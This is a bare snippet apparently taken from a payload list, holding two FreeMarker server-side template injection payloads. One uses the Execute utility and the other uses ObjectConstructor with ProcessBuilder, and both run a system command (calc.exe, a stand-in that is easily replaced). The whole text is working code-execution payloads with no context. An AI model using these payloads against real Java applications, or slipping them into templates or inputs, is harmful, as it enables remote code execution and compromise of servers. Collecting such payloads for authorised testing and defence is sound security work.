```
<#assign value="freemarker.template.utility.Execute"?new()>${value("calc.exe")}

<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","calc.exe").start()}
```
